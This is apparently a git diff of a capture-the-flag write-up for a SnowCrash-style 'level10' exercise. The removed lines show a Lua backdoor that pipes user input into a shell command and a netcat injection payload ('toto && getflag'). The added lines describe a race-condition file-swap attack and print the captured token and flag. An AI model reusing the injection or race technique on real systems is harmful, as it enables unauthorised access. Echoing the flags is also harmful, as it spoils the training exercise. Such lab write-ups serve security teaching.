@@ -1,61 +1,30 @@
-# cat README
-```
-level10@BornToSec:~$ cat README
-There is a backdoor who run on port 5151.
-We can provide you with this script here!
-```
-# cat level10.lua
-```
-level10@BornToSec:~$ cat level10.lua
-#!/usr/bin/env lua
-local socket = require("socket")
-local server = assert(socket.bind("127.0.0.1", 5151))
-
-function hash(pass)
-  prog = io.popen("echo "..pass.." | sha1sum", "r")
-  data = prog:read("*all")
-  prog:close()
-
-  data = string.sub(data, 1, 40)
-
-  return data
-end
+We can see by usings strings that the binary comunicate a file over a socket on the port 6969,
+If we try to send the token
 
 
-while 1 do
-  local client = server:accept()
-  client:send("Password: ")
-  client:settimeout(60)
-  local l, err = client:receive()
-  if not err then
-      print("trying " .. l)
-      local h = hash(l)
+```
+level10@SnowCrash:~$ ./level10 token 129.0.0.1
+You don't have access to token
+```
 
-      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
-          client:send("Erf nope..\n");
-      else
-          client:send("Gz you dumb*\n")
-      end
+We can see that the program check if we have the right to read the file,
+It's possible to trick him by swaping a fake file with the right and the token in between the right checking and the reading and sending over the socket
+As an annex you can see the script that I use.
+It create the swap file with the same header as the binary send
+Open a netcat loop that will remove all headers occurences and put it in a file, then put all that in a job
+It loop over the binary by sending the swap file on localhost:6969 and put it into a job
+then it swap the swap file and the token
 
-  end
+You can now sinply run it and wait few seconds then kill it and cat the token file, without forgetting to remove the blanks
 
-  client:close()
-end
 ```
-# we can already see the vuln in hash function
+level10@SnowCrash:~$ cat /tmp/token | grep [^[:blank:]]
+woupa2yuojeeaaed06riuj63c
+...
 ```
-prog = io.popen("echo "..pass.." | sha1sum", "r")
-```
-# passing userinput inside shell command
-# we just need to connect to the backdoor
-# and inject the getflag cmd
-```
-evel10@BornToSec:~$ nc 127.0.0.1 5151
-Password: toto && getflag /tmp/theflag
-Erf nope..
-```
-# we just need to cat the file
-```
-level10@BornToSec:~$ cat /tmp/theflag
+
+And we can see multiple time the content of ~/token, now we login and getflag
+
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
 Check flag.Here is your token : feulo4b72j7edeahuete3no7c
-```
